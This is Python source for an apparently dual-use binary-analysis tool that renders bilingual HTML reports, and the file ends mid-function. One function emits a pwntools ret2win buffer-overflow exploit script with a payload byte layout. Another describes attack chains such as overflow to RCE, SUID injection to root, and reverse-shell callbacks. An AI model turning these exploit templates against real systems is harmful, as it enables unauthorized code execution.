"""Self-contained, professional, bilingual (ES/EN) interactive HTML report.

No external assets. Light/dark toggle (persisted), language toggle, KPI dashboard,
mitigation risk panel, severity distribution, filterable findings, attack surface and the
full evidence trail. Opens in any browser, works offline, safe to share."""
from __future__ import annotations

import html as _html
import json as _json
import re
from datetime import datetime
from typing import List, Optional

from ..store.session import Finding

_SEV = ["critical", "high", "medium", "low", "info"]
_SEV_COLOR = {"critical": "#e5484d", "high": "#f76808", "medium": "#f5b800",
              "low": "#30a46c", "info": "#5b8def"}
_VERDICT_COLOR = {"verified": "#30a46c", "grounded": "#5b8def", "unverified": "#f5b800"}


def _esc(s) -> str:
    return _html.escape(str(s if s is not None else ""))


def _badge(text, color):
    return f'<span class="badge" style="background:{color}">{_esc(text)}</span>'


def _md(s) -> str:
    """Minimal, safe markdown: escape, then render **bold**, `code` and paragraphs."""
    import re as _re
    t = _esc(s)
    t = _re.sub(r"\*\*(.+?)\*\*", r"<strong>\1</strong>", t)
    t = _re.sub(r"`([^`]+)`", r"<code>\1</code>", t)
    return t


_MD_OL_RE = __import__("re").compile(r"^(\d+)\.\s+(.*)$")


def _md_rich(s: str) -> str:
    """Markdown enriquecido para la decompilacion anotada y los informes de agentes (Investigar/
    Entrenar/Dataset): bloques ``` de codigo, cabeceras #/##/###, listas (con y sin numeros),
    tablas y **negrita**/`codigo`. Suficiente para el texto que produce el LLM o los renderers."""
    import re as _re
    s = s or ""
    out = []
    in_list = None  # None | 'ul' | 'ol'

    def close_list():
        nonlocal in_list
        if in_list:
            out.append(f"</{in_list}>"); in_list = None

    def inline(t: str) -> str:
        h = _esc(t)
        h = _re.sub(r"\*\*(.+?)\*\*", r"<strong>\1</strong>", h)
        h = _re.sub(r"`([^`]+)`", r"<code>\1</code>", h)
        return h

    parts = _re.split(r"```[a-zA-Z]*\n?", s)     # alterna prosa / codigo
    for i, part in enumerate(parts):
        if i % 2 == 1:                            # dentro de un bloque de codigo
            close_list()
            out.append(f'<pre class="code">{_esc(part.rstrip())}</pre>')
            continue
        lines = part.splitlines()
        j = 0
        while j < len(lines):
            t = lines[j].strip()
            if not t:
                close_list(); j += 1; continue
            # tabla: fila '| a | b |' seguida de la fila separadora '|---|---|'
            if (t.startswith("|") and j + 1 < len(lines)
                    and _re.match(r"^\s*\|?\s*:?-{2,}:?\s*(\|\s*:?-{2,}:?\s*)+\|?\s*$", lines[j + 1])):
                close_list()
                def row(ln):
                    c = ln.strip()
                    c = c[1:] if c.startswith("|") else c
                    c = c[:-1] if c.endswith("|") else c
                    return [x.strip() for x in c.split("|")]
                head = row(t); j += 2
                rows = []
                while j < len(lines) and lines[j].strip().startswith("|"):
                    rows.append(row(lines[j])); j += 1
                thead = "".join(f"<th>{inline(c)}</th>" for c in head)
                tbody = "".join("<tr>" + "".join(f"<td>{inline(c)}</td>" for c in r) + "</tr>"
                                for r in rows)
                out.append(f'<div class="tbl-wrap"><table><thead><tr>{thead}</tr></thead>'
                           f'<tbody>{tbody}</tbody></table></div>')
                continue
            if t.startswith("### "):
                close_list(); out.append(f'<h5>{inline(t[4:])}</h5>')
            elif t.startswith("## "):
                close_list(); out.append(f'<h4>{inline(t[3:])}</h4>')
            elif t.startswith("# "):
                close_list(); out.append(f'<h3>{inline(t[2:])}</h3>')
            elif t.startswith(("- ", "* ")):
                if in_list != "ul":
                    close_list(); out.append("<ul>"); in_list = "ul"
                out.append(f"<li>{inline(t[2:])}</li>")
            elif _MD_OL_RE.match(t):
                if in_list != "ol":
                    close_list(); out.append("<ol>"); in_list = "ol"
                out.append(f"<li>{inline(_MD_OL_RE.match(t).group(2))}</li>")
            else:
                close_list()
                out.append(f"<p>{inline(t)}</p>")
            j += 1
        close_list()
    return "".join(out)


_ENGINE_LABEL = {"ghidra": "Ghidra", "decai": "decai (r2ai)", "pdg": "r2 (r2ghidra)",
                 "pdc": "r2 (pdc)", "pdf": "r2 (disasm)"}


def _dec_tech_html(tech: dict, es: bool) -> str:
    """Ficha tecnica grounded de la funcion: firma, marco, convencion y variables locales con su
    offset a RBP y la DISTANCIA a la direccion de retorno guardada (= offset de overflow)."""
    if not tech:
        return ""
    head = []
    if tech.get("signature"):
        head.append(f"<code>{_esc(tech['signature'])}</code>")
    meta = []
    if tech.get("frame") is not None:
        meta.append(("marco" if es else "frame") + f": {tech['frame']} B")
    if tech.get("cc"):
        meta.append(("convencion" if es else "convention") + f": {_esc(str(tech['cc']))}")
    if tech.get("bits"):
        meta.append(f"{tech['bits']}-bit")
    if tech.get("nbbs") is not None:
        meta.append(("bloques" if es else "blocks") + f": {tech['nbbs']}")
    rows = ""
    for v in tech.get("locals", [])[:12]:
        off = v.get("offset")
        offs = (f"{v.get('base','rbp')}{'' if not isinstance(off,int) else ('%+d' % off)}"
                + (f" ({hex(off) if isinstance(off,int) else ''})" if isinstance(off, int) else ""))
        tr = v.get("to_ret")
        trs = (f"{tr} B" if isinstance(tr, int) else "-")
        rows += (f"<tr><td><code>{_esc(v.get('name','?'))}</code></td><td>{_esc(v.get('type','') or '-')}</td>"
                 f"<td><code>{_esc(offs)}</code></td><td>{trs}</td></tr>")
    tbl = ""
    if rows:
        th = (("Variable", "Tipo", "Offset", "a RIP guardado") if es
              else ("Variable", "Type", "Offset", "to saved RIP"))
        tbl = (f'<table class="dectech"><thead><tr>' + "".join(f"<th>{_esc(x)}</th>" for x in th)
               + f'</tr></thead><tbody>{rows}</tbody></table>')
    note = ("'a RIP guardado' = |offset| + tamano de palabra: es el numero de bytes de entrada para "
            "pisar la direccion de retorno desde esa variable (offset de overflow)." if es else
            "'to saved RIP' = |offset| + word size: the number of input bytes to overwrite the return "
            "address from that variable (overflow offset).")
    lbl = "Ficha tecnica" if es else "Technical fiche"
    return (f'<details class="sec" open><summary>{lbl}</summary>'
            + ("<div class='mut' style='margin:4px 0'>" + " &middot; ".join(head + meta) + "</div>" if (head or meta) else "")
            + tbl + (f"<p class='mut' style='font-size:11.5px;margin:6px 0 0'>{_esc(note)}</p>" if tbl else "")
            + "</details>")


def _decompiled_html(decompiled, lang: str = "es") -> str:
    """Seccion de decompilacion: pseudo-C conciliado + explicacion por funcion, la COMPARATIVA lado a
    lado de cada motor (Ghidra vs decai vs r2) y el contraste determinista entre ellos."""
    if not decompiled:
        return ""
    es = lang == "es"
    cards = ""
    for d in decompiled:
        ann = getattr(d, "annotated", "") or ""
        raw = getattr(d, "raw", "") or ""
        engine = getattr(d, "engine", "") or "r2"
        func = getattr(d, "func", "?")
        variants = getattr(d, "variants", []) or []
        crosscheck = getattr(d, "crosscheck", "") or ""
        elabel = _ENGINE_LABEL.get(engine, engine)
        body = _md_rich(ann) if ann.strip() else (
            f'<p class="mut">{"Sin modelo local: solo decompilado crudo (levanta ollama para la version anotada)." if es else "No local model: raw decompilation only (start ollama for the annotated version)."}</p>')
        # comparativa lado a lado de los motores disponibles
        cmp_html = ""
        if len(variants) >= 2:
            cols = "".join(
                f'<div class="deccol"><div class="deccol-h">{_esc(_ENGINE_LABEL.get(eng, eng))}</div>'
                f'<pre>{_esc(code[:4000])}</pre></div>' for eng, code in variants)
            title = "Comparativa de motores (lado a lado)" if es else "Engine comparison (side by side)"
            cmp_html = (f'<details class="sec" open><summary>{_esc(title)} '
                        f'<span class="src">{len(variants)}</span></summary>'
                        f'<div class="deccmp">{cols}</div></details>')
        elif raw.strip():
            cmp_html = (f'<details class="sec"><summary>{"decompilado crudo" if es else "raw decompilation"} '
                        f'({_esc(elabel)})</summary><pre>{_esc(raw)}</pre></details>')
        cross_html = ""
        if crosscheck:
            lbl = "Contraste entre motores" if es else "Cross-check between engines"
            cross_html = (f'<div class="deccross"><b>{_esc(lbl)}:</b> {_esc(crosscheck)}</div>')
        tech_html = _dec_tech_html(getattr(d, "tech", {}) or {}, es)
        suffix = " + LLM" if ann.strip() else ""
        cards += (f'<div class="decfn"><div class="decfn-h"><span class="decfn-t">{_esc(func)}</span>'
                  f'<span class="decfn-e">{_esc(elabel)}{suffix}</span></div>'
                  f'{tech_html}<div class="md">{body}</div>{cross_html}{cmp_html}</div>')
    return f'<h2 data-i18n="decompiled" id="sec-dec"></h2>{cards}'


import re as _re_mod


def _exploit_section(binary: str, findings, lang: str) -> str:
    """Reproduccion paso a paso + script pwntools del exploit verificado (si lo hay)."""
    vf = next((f for f in findings if f.verdict == "verified" and "ret2win" in (f.title + (f.evidence or "")).lower()), None)
    if vf is None:
        return ""
    m = _re_mod.search(r"offset\s*=\s*(\d+)", vf.evidence or "")
    off = int(m.group(1)) if m else None
    mw = _re_mod.search(r"win\s*=\s*(0x[0-9a-fA-F]+)", (vf.location or "") + " " + (vf.evidence or ""))
    win = mw.group(1) if mw else "0x0"
    name = _esc(_os_basename(binary))
    T = _EXP_STR.get(lang, _EXP_STR["es"])
    steps = "".join(f'<li>{s}</li>' for s in T["steps"](off if off is not None else "N", win))
    script = (f'from pwn import *\n'
              f'context.binary = elf = ELF("./{name}")\n\n'
              f'# io = remote("HOST", PORT)      # {T["remote"]}\n'
              f'io = process("./{name}")          # {T["local"]}\n\n'
              f'offset = {off if off is not None else "N"}{" "*3}# {T["offc"]}\n'
              f'payload  = b"A" * offset\n'
              f'payload += p64(elf.sym.win)       # ret2win -> {win}\n'
              f'# {T["align"]}\n'
              f'# payload = b"A"*offset + p64(RET) + p64(elf.sym.win)\n\n'
              f'io.sendline(payload)\n'
              f'io.interactive()                  # -> shell')
    layout = _payload_layout_html(off, win, lang)
    return (f'<h2 data-i18n="exploit_steps" id="sec-exploit"></h2>'
            f'<div class="expwrap"><div class="expcol"><div class="panel-t">{T["repro"]}</div>'
            f'<ol class="steps">{steps}</ol></div>'
            f'<div class="expcol"><div class="panel-t">{T["script"]}</div>'
            f'<pre class="code">{_esc(script)}</pre></div></div>{layout}')


def _le_bytes(addr_hex: str, width: int = 8):
    """Bytes little-endian de una direccion (hex str) como lista de '0xNN'."""
    try:
        v = int(addr_hex, 16)
    except (ValueError, TypeError):
        return []
    return ["%02x" % ((v >> (8 * i)) & 0xff) for i in range(width)]


def _payload_layout_html(off, win, lang: str) -> str:
    """Diagrama tecnico del layout de bytes del payload ret2win: relleno hasta el offset y la
    direccion de retorno sobrescrita en little-endian, con offsets en decimal/hex."""
    if not isinstance(off, int):
        return ""
    es = lang == "es"
    le = _le_bytes(win)
    lebytes = " ".join(le) if le else "?"
    th = (("Offset", "Bytes", "Contenido", "Significado") if es
          else ("Offset", "Bytes", "Content", "Meaning"))
    rows = (
        f'<tr><td><code>0x00 .. 0x{off-1:02x}</code><br><span class="mut">0 .. {off-1}</span></td>'
        f'<td><code>41 41 .. 41</code> <span class="mut">({off} B)</span></td>'
        f'<td><code>b"A" * {off}</code></td>'
        f'<td>{"relleno: llena el buffer local + el RBP salvado (8 B) hasta la direccion de retorno" if es else "padding: fills the local buffer + saved RBP (8 B) up to the return address"}</td></tr>'
        f'<tr class="lrip"><td><code>0x{off:02x} .. 0x{off+7:02x}</code><br><span class="mut">{off} .. {off+7}</span></td>'
        f'<td><code>{_esc(lebytes)}</code> <span class="mut">(8 B LE)</span></td>'
        f'<td><code>p64({_esc(win)})</code></td>'
        f'<td>{"sobrescribe la DIRECCION DE RETORNO guardada (RIP): al ejecutar `ret` el flujo salta aqui" if es else "overwrites the saved RETURN ADDRESS (RIP): on `ret` the flow jumps here"} &rarr; win()</td></tr>')
    total = off + 8
    cap = ("Layout del payload (" + str(total) + " B). El qword en little-endian es como x86-64 "
           "almacena la direccion en memoria; `ret` toma [RSP] como nuevo RIP." if es else
           "Payload layout (" + str(total) + " B). The little-endian qword is how x86-64 stores the "
           "address in memory; `ret` takes [RSP] as the new RIP.")
    ttl = "Layout de bytes del payload" if es else "Payload byte layout"
    return (f'<details class="sec" open><summary>{ttl}</summary>'
            f'<table class="paylay"><thead><tr>' + "".join(f"<th>{_esc(x)}</th>" for x in th)
            + f'</tr></thead><tbody>{rows}</tbody></table>'
            f'<p class="mut" style="font-size:11.5px;margin:6px 0 0">{_esc(cap)}</p></details>')


def _mit_detail(mit: dict, lang: str) -> str:
    """Cada mitigacion: estado, que implica para explotacion y como remediar."""
    T = _MIT_STR.get(lang, _MIT_STR["es"])
    rows = ""
    order = (["ASLR", "DEP", "CFG", "Canary", "Authenticode"] if mit.get("bintype") == "pe"
             else ["NX", "PIE", "Canary", "RELRO"])
    for k in order:
        v = mit.get(k)
        info = T[k](v)
        cls = info["cls"]
        rows += (f'<tr class="mitrow {cls}"><td class="mk">{_esc(k)}</td>'
                 f'<td class="mstate">{_esc(info["state"])}</td>'
                 f'<td>{_esc(info["impact"])}</td>'
                 f'<td class="mrem">{_esc(info["rem"])}</td></tr>')
    return (f'<h2 data-i18n="mit_detail" id="sec-mit"></h2>'
            f'<table class="mittab"><thead><tr><th>{T["h_mit"]}</th><th>{T["h_state"]}</th>'
            f'<th>{T["h_impact"]}</th><th>{T["h_rem"]}</th></tr></thead><tbody>{rows}</tbody></table>')


def _capability_html(cap_map: dict, lang: str) -> str:
    """Mapa de capacidades (Fase 2): por cada categoria con imports, un chip con el recuento y
    las funciones detectadas. Vacio si no hay ninguna categoria (no es PE, o sin imports Win32
    reconocidos) -- el llamador ya filtra por bintype=pe antes de construir cap_map."""
    if not cap_map:
        return ""
    es = lang == "es"
    title = ("Mapa de capacidades (por imports)" if es else "Capability map (from imports)")
    note = ("Lo que el binario PUEDE hacer, clasificado por los imports detectados -- antes de "
            "mirar ninguna funcion. Indica donde merece la pena profundizar." if es else
            "What the binary CAN do, classified from its detected imports -- before reading any "
            "function. Points to where it is worth digging in.")
    cards = ""
    for key, _es_pair, _en_pair, _pat in _PE_CAPABILITIES:
        hits = cap_map.get(key)
        if not hits:
            continue
        lbl = _es_pair[1] if es else _en_pair[1]
        fn_chips = "".join(f'<span class="refchip">{_esc(h)}</span>' for h in hits[:12])
        more = len(hits) - 12
        more_txt = (f' <span class="mut">+{more}</span>' if more > 0 else "")
        cards += (f'<div class="panel" style="margin:8px 0"><div class="panel-t">{_esc(lbl)} '
                  f'<span class="mut">({len(hits)})</span></div>'
                  f'<div class="refchips">{fn_chips}{more_txt}</div></div>')
    if not cards:
        return ""
    return (f'<h2>{_esc(title)}</h2><p class="sechelp">{_esc(note)}</p>{cards}')


def _packing_warning_html(pk: dict, lang: str) -> str:
    """Fase 0: si hay indicios de empaquetado, un aviso BIEN VISIBLE antes de cualquier otra
    seccion -- el resto del informe (imports, cadenas, funciones) puede estar viendo el stub del
    packer, no el programa real, y hay que saberlo antes de leer nada mas."""
    if not pk:
        return ""
    es = lang == "es"
    title = ("Posible empaquetado / cifrado" if es else "Possibly packed / encrypted")
    parts = []
    for name, packer in pk.get("packer_sections", []):
        parts.append((f"seccion '{name}' (firma conocida de {packer})" if es
                      else f"section '{name}' (known {packer} signature)"))
    for name, ent in pk.get("high_entropy", []):
        parts.append((f"seccion '{name}' con entropia {ent:.2f} (>= {_ENTROPY_PACKED_THRESHOLD})"
                      if es else f"section '{name}' with entropy {ent:.2f} (>= {_ENTROPY_PACKED_THRESHOLD})"))
    lf = pk.get("low_fncount")
    if lf:
        nfcn, size = lf
        parts.append((f"solo {nfcn} funciones detectadas para un binario de {size:,} bytes "
                      "(tipico del stub de un packer, no del programa real)" if es else
                      f"only {nfcn} functions detected for a {size:,}-byte binary "
                      "(typical of a packer stub, not the real program)"))
    body = "; ".join(parts)
    note = ("El resto del analisis estatico (imports, cadenas, funciones) puede estar viendo el "
            "STUB del empaquetador, no el programa real: los resultados de abajo son menos "
            "fiables hasta desempaquetar." if es else
            "The rest of the static analysis (imports, strings, functions) may be looking at the "
            "packer's STUB, not the real program: the results below are less reliable until "
            "unpacked.")
    return (f'<div class="proof" style="border-color:#e5484d;box-shadow:0 0 0 1px rgba(229,72,77,.15)">'
            f'<div class="proof-h" style="background:#1a0e0e;border-color:#e5484d">'
            f'<span class="proof-ok" style="color:#e5484d">&#9888;</span>'
            f'<span class="proof-t">{_esc(title)}</span></div>'
            f'<div style="padding:10px 13px;color:var(--fg);font-size:13px">{_esc(body)}'
            f'<p class="mut" style="font-size:12px;margin:8px 0 0">{_esc(note)}</p></div></div>')


# Mapa tecnica -> cheat sheets del RAG + fuentes autoritativas.
_REF_MAP = {
    "ret2win": (["ret2win", "rop"], []),
    "overflow": (["mitigations", "pie", "canary-bypass"], []),
    "read": (["mitigations", "shellcoding"], []),
    "system": (["got-plt"], []),
    "rop": (["rop", "advanced-rop", "syscall-table"], []),
    "format": (["format-string", "got-plt"], []),
    "heap": (["heap", "modern-heap", "heap-version-matrix"], ["shellphish/how2heap"]),
    "kernel": (["kernel-pwn", "kernel-mitigations"], ["xairy/linux-kernel-exploitation"]),
}


def _attack_chain(findings, mit: dict, lang: str) -> str:
    """Cadenas de explotacion: encadena los fallos detectados en un camino de ataque paso a paso,
    grounded en los hallazgos y mitigaciones (como un fallo habilita el siguiente hasta el objetivo)."""
    tl = " ".join((f.title + " " + (f.location or "")).lower() for f in findings)
    es = lang == "es"
    def has(*ws): return any(w in tl for w in ws)
    verified = next((f for f in findings if f.verdict == "verified" and "ret2" in (f.title + (f.evidence or "")).lower()), None)
    chains = []  # (titulo, [(paso, detalle, kind)])
    # 1) corrupcion de memoria -> RCE
    if has("desbordamiento", "overflow", "ret2win", "read"):
        steps = [("Entrada sin acotar" if es else "Unbounded input",
                  "Un sink de lectura escribe mas alla del buffer: overflow controlable por el atacante."
                  if es else "A read sink writes past the buffer: attacker-controllable overflow.", "grounded")]
        if mit.get("Canary") is False:
            steps.append(("Sin stack canary" if es else "No stack canary",
                          "El overflow lineal alcanza y sobrescribe la direccion de retorno guardada."
                          if es else "The linear overflow reaches and overwrites the saved return address.", "grounded"))
        if mit.get("PIE") is False:
            steps.append(("Sin PIE" if es else "No PIE",
                          "El codigo esta en direcciones FIJAS: el objetivo se puede hardcodear sin leak."
                          if es else "Code is at FIXED addresses: the target can be hardcoded, no leak needed.", "grounded"))
        if has("gadget", "system", "win", "ret2win"):
            steps.append(("Funcion objetivo (gift)" if es else "Target function (gift)",
                          "Existe win()/system('/bin/sh') como destino del control de flujo."
                          if es else "win()/system('/bin/sh') exists as the control-flow target.", "grounded"))
        if verified:
            steps.append(("Shell (VERIFICADO)" if es else "Shell (VERIFIED)",
                          "Se sobrescribe RIP con la funcion objetivo y se obtiene shell en sandbox (uid=0)."
                          if es else "RIP is overwritten with the target and a shell is obtained in the sandbox (uid=0).",
                          "verified"))
        chains.append((("Corrupcion de memoria -> RCE" if es else "Memory corruption -> RCE"), steps))
    # 2) credenciales -> acceso no autorizado
    if has("credencial", "secreto", "hardcod", "clave privada", "aws", "token", "jwt"):
        chains.append((("Credenciales -> acceso no autorizado" if es else "Credentials -> unauthorized access"),
            [("Secreto hardcodeado" if es else "Hardcoded secret",
              "El binario embebe una credencial/clave/token extraible de las strings."
              if es else "The binary embeds a credential/key/token extractable from strings.", "grounded"),
             ("Auth bypass / acceso" if es else "Auth bypass / access",
              "Con la credencial expuesta se accede a sistemas o datos protegidos (o se firma como legitimo)."
              if es else "With the exposed credential, protected systems/data are accessed (or signed as legit).", "grounded")]))
    # 3) SUID + inyeccion -> root
    if has("setuid", "setgid") and has("inyeccion de comando", "command injection", "system"):
        chains.append((("SUID + inyeccion -> root" if es else "SUID + injection -> root"),
            [("Binario SUID" if es else "SUID binary", "Corre con privilegios elevados." if es else "Runs with elevated privileges.", "grounded"),
             ("Inyeccion de comando" if es else "Command injection", "Entrada controlable llega a system/exec." if es else "Controllable input reaches system/exec.", "grounded"),
             ("Root" if es else "Root", "El comando inyectado se ejecuta como root." if es else "The injected command runs as root.", "grounded")]))
    # 4) callback en runtime -> C2 / exfiltracion (observado dinamicamente)
    if has("conexion saliente en runtime", "runtime outbound", "reverse shell", "bind shell"):
        rev = has("reverse shell") or has("conexion saliente")
        chains.append((("Callback en runtime -> C2 / exfiltracion" if es else "Runtime callback -> C2 / exfiltration"),
            [("Shell/socket a atacante" if es else "Shell/socket to attacker",
              "El binario abre un canal de red hacia un atacante (reverse/bind shell)." if es
              else "The binary opens a network channel to an attacker (reverse/bind shell).", "grounded"),
             ("Conexion observada en runtime" if es else "Connection observed at runtime",
              "En ejecucion (sandbox) se intercepto el intento de conexion al destino: comportamiento verificado."
              if es else "At runtime (sandbox) the connection attempt to the destination was intercepted: verified behavior.",
              "verified"),
             ("Control remoto / robo de datos" if es else "Remote control / data theft",
              "El canal da al atacante ejecucion de comandos o salida para exfiltrar." if es
              else "The channel gives the attacker command execution or an egress path to exfiltrate.", "grounded")]))
    # 5) sin TLS / cert -> MITM
    if has("sin cifrar", "cleartext", "certificado", "certificate"):
        chains.append((("Transporte inseguro -> MITM" if es else "Insecure transport -> MITM"),
            [("Sin cifrado / sin validar cert" if es else "No encryption / no cert check",
              "El trafico va en claro o se acepta cualquier certificado." if es else "Traffic is cleartext or any certificate is accepted.", "grounded"),
             ("Interceptar / modificar" if es else "Intercept / modify",
              "Un atacante en la red lee y altera la comunicacion (credenciales, actualizaciones)."
              if es else "A network attacker reads and alters the communication (credentials, updates).", "grounded")]))
    if not chains:
        return ""
    _KC = {"verified": "#30a46c", "grounded": "#5b8def"}
    blocks = ""
    for title, steps in chains:
        row = ""
        for i, (name, detail, kind) in enumerate(steps):
            arrow = '<div class="chain-arr">&#8594;</div>' if i else ""
            row += (arrow + f'<div class="chain-step" style="border-color:{_KC.get(kind, "#5b8def")}">'
                    f'<div class="chain-n">{_esc(name)}</div><div class="chain-d">{_esc(detail)}</div></div>')
        blocks += f'<div class="chain-t">{_esc(title)}</div><div class="chain-row">{row}</div>'
    note = ("Cadena grounded: cada eslabon sale de un hallazgo o mitigacion reales; el paso "
            "'VERIFICADO' esta probado por ejecucion, los demas son el razonamiento del encadenamiento."
            if es else "Grounded chain: each link comes from a real finding or mitigation; the "
            "'VERIFIED' step is proven by execution, the rest are the chaining rationale.")
    return (f'<h2 data-i18n="attack_chain" id="sec-chain"></h2>'
            f'<p class="mut" style="font-size:12px;margin:-4px 0 10px">{_esc(note)}</p>{blocks}')


def _references(findings, lang: str) -> str:
    """Referencias: cheat sheets del RAG relevantes a lo detectado + fuentes autoritativas."""
    blob = " ".join((f.title + " " + (f.evidence or "") + " " + (f.location or "")) for f in findings).lower()
    sheets, ext = [], []
    for key, (sh, ex) in _REF_MAP.items():
        if key in blob:
            for s in sh:
                if s not in sheets:
                    sheets.append(s)
            for e in ex:
                if e not in ext:
                    ext.append(e)
    if not sheets:
        sheets = ["methodology", "mitigations"]
    T = _REF_STR.get(lang, _REF_STR["es"])
    chips = "".join(f'<code class="refchip">binoracle kb "{_esc(s)}"</code>' for s in sheets)
    extl = "".join(f'<li>{_esc(e)}</li>' for e in ext)
    ext_html = f'<div class="panel-t" style="margin-top:12px">{T["ext"]}</div><ul class="reflist">{extl}</ul>' if ext else ""
    return (f'<h2 data-i18n="references" id="sec-refs"></h2>'
            f'<p class="mut" style="font-size:12px">{T["note"]}</p>'
            f'<div class="refchips">{chips}</div>{ext_html}')


def _os_basename(p: str) -> str:
    import os as _os
    return _os.path.basename(p) or "binary"


# Explicacion en lenguaje claro de cada seccion de la superficie de ataque (por palabra clave).
_SURFACE_HELP = [
    (("elf header", "header", "file /"),
     "Cabecera del ejecutable: arquitectura, tipo (EXEC/DYN), punto de entrada. Es lo primero "
     "para saber QUE es el binario y como esta construido.",
     "Executable header: architecture, type (EXEC/DYN), entry point. The first thing to know "
     "WHAT the binary is and how it is built."),
    (("checksec", "mitigation", "mitigaciones"),
     "Mitigaciones de explotacion activas (NX, PIE, canary, RELRO). Deciden que rutas de ataque "
     "son viables: sin canary el overflow pisa el retorno directo; sin PIE las direcciones son fijas.",
     "Active exploit mitigations (NX, PIE, canary, RELRO). They decide which attack paths are "
     "viable: no canary means the overflow overwrites the return directly; no PIE means fixed addresses."),
    (("binary info", "iI", "info radare"),
     "Metadatos de radare2: formato, bits, compilador, si esta 'stripped' (sin simbolos). Contexto "
     "general del binario.",
     "radare2 metadata: format, bits, compiler, whether it is stripped. General context of the binary."),
    (("hardening", "fortify", "asan", "cfi", "safestack"),
     "Protecciones modernas del compilador (FORTIFY_SOURCE, AddressSanitizer, CFI, SafeStack). "
     "Endurecen el binario frente a corrupcion de memoria y desvio de flujo.",
     "Modern compiler protections (FORTIFY_SOURCE, AddressSanitizer, CFI, SafeStack). They harden "
     "the binary against memory corruption and control-flow hijacking."),
    (("imports",),
     "Funciones que el binario importa de librerias: su 'capacidad' (que puede hacer: red, "
     "ficheros, exec, cripto). Delatan la superficie y las funciones peligrosas.",
     "Functions the binary imports from libraries: its 'capability' (what it can do: network, "
     "files, exec, crypto). They reveal the surface and the dangerous functions."),
    (("dangerous sinks", "sinks"),
     "Funciones PELIGROSAS (gets, strcpy, system, read...) y desde donde se llaman. Es el punto de "
     "partida: cada sink alcanzable por entrada del usuario es un candidato a vulnerabilidad.",
     "DANGEROUS functions (gets, strcpy, system, read...) and where they are called from. The "
     "starting point: every sink reachable by user input is a vulnerability candidate."),
    (("vtable", "c++"),
     "Tablas virtuales de C++ (vtables): punteros a metodos. Si se corrompen (UAF/type-confusion), "
     "una llamada virtual salta a codigo del atacante.",
     "C++ virtual tables (vtables): pointers to methods. If corrupted (UAF/type-confusion), a "
     "virtual call jumps to attacker code."),
    (("heap",),
     "Superficie de heap: llamadas a malloc/free/realloc. Candidatos a use-after-free, "
     "double-free y overflow de heap.",
     "Heap surface: malloc/free/realloc calls. Candidates for use-after-free, double-free and "
     "heap overflow."),
    (("indirect control", "indirect", "punteros a funcion"),
     "Saltos y llamadas INDIRECTAS (call/jmp rax): el destino sale de un registro/puntero (heap, "
     "pila, vtable). Si controlas ese puntero, desvias el flujo de ejecucion.",
     "INDIRECT jumps and calls (call/jmp rax): the target comes from a register/pointer (heap, "
     "stack, vtable). If you control that pointer, you hijack execution flow."),
    (("strings", "izz"),
     "Cadenas del binario: rutas, formatos, mensajes, posibles secretos o URLs. Utiles para "
     "entender el comportamiento y encontrar credenciales.",
     "Binary strings: paths, formats, messages, possible secrets or URLs. Useful to understand "
     "behavior and find credentials."),
]


def _surface_help(key: str, lang: str) -> str:
    k = key.lower()
    for kws, es, en in _SURFACE_HELP:
        if any(w in k for w in kws):
            return es if lang == "es" else en
    return ""


def _cfg_layout(cfg):
    """Calcula posiciones (x,y,h) de cada bloque por profundidad BFS. En SERVIDOR, para que el
    grafo se vea SIEMPRE (aunque no corra JS)."""
    nodes = {n["id"]: dict(n) for n in cfg.nodes}
    order = [n["id"] for n in cfg.nodes]
    adj = {}
    for e in cfg.edges:
        adj.setdefault(e["src"], []).append(e["dst"])
    depth = {order[0]: 0} if order else {}
    q = list(order[:1])
    while q:
        u = q.pop(0)
        for v in adj.get(u, []):
            if v not in depth:
                depth[v] = depth[u] + 1
                q.append(v)
    for nid in order:
        depth.setdefault(nid, 0)
    byd = {}
    for nid in order:
        byd.setdefault(depth[nid], []).append(nid)
    W = 210
    for nid in order:
        n = nodes[nid]
        n["h"] = 26 + min(len(n["insns"]), 6) * 15 + (15 if len(n["insns"]) > 6 else 0)
    y = 0
    for d in sorted(byd):
        row = byd[d]
        maxh = max(nodes[i]["h"] for i in row)
        tot = len(row) * W + (len(row) - 1) * 48
        for i, nid in enumerate(row):
            nodes[nid]["x"] = i * (W + 48) - tot / 2
            nodes[nid]["y"] = y
        y += maxh + 64
    return nodes, order, W


def _cfg_html(cfg, lang: str) -> str:
    """Grafo de flujo de una funcion, RENDERIZADO EN SERVIDOR (visible sin JS) + interactividad
    (mover/zoom/arrastrar) por JS encima. Nodos = bloques; aristas coloreadas por tipo de salto."""
    if cfg is None or not getattr(cfg, "ok", False):
        return ""
    nodes, order, W = _cfg_layout(cfg)
    _COL = {"taken": "#30a46c", "jump": "#4aa3ff", "fallthrough": "#8b95a1"}
    # aristas (curvas bezier de la base del origen al techo del destino)
    edges_svg = ""
    for e in cfg.edges:
        a, b = nodes.get(e["src"]), nodes.get(e["dst"])
        if not a or not b:
            continue
        x1, y1 = a["x"] + W / 2, a["y"] + a["h"]
        x2, y2 = b["x"] + W / 2, b["y"]
        my = (y1 + y2) / 2
        edges_svg += (f'<path class="cfge" data-s="{e["src"]}" data-d="{e["dst"]}" '
                      f'd="M{x1:.0f},{y1:.0f} C{x1:.0f},{my:.0f} {x2:.0f},{my:.0f} {x2:.0f},{y2:.0f}" '
                      f'fill="none" stroke="{_COL.get(e["kind"], "#8b95a1")}" stroke-width="2" '
                      f'marker-end="url(#ah)"/>')
    # nodos (rect + direccion + instrucciones)
    nodes_svg = ""
    for nid in order:
        n = nodes[nid]
        ins = "".join(f'<text x="9" y="{30 + i * 15}" class="cfgins">{_esc((op.get("txt") or "")[:28])}</text>'
                      for i, op in enumerate(n["insns"][:6]))
        if len(n["insns"]) > 6:
            ins += f'<text x="9" y="{30 + 6 * 15}" class="cfgins">... +{len(n["insns"]) - 6}</text>'
        nodes_svg += (f'<g class="cfgnode" data-id="{nid}" transform="translate({n["x"]:.0f},{n["y"]:.0f})">'
                      f'<rect width="{W}" height="{n["h"]}" rx="7"/>'
                      f'<text x="9" y="16" class="cfgaddr">{_esc(n["addr"])}</text>{ins}</g>')
    T = {"es": {"func": "funcion", "hint": "Arrastra el fondo para moverte, rueda para zoom, "
                "arrastra un bloque para recolocarlo. Cada arista es un salto:",
                "taken": "rama tomada (condicion verdadera)", "fall": "caida / fall-through (condicion falsa)",
                "jump": "salto incondicional", "reset": "centrar"},
         "en": {"func": "function", "hint": "Drag the background to pan, wheel to zoom, drag a "
                "block to move it. Each edge is a jump:", "taken": "branch taken (condition true)",
                "fall": "fall-through (condition false)", "jump": "unconditional jump", "reset": "center"}}[
        lang if lang in ("es", "en") else "es"]
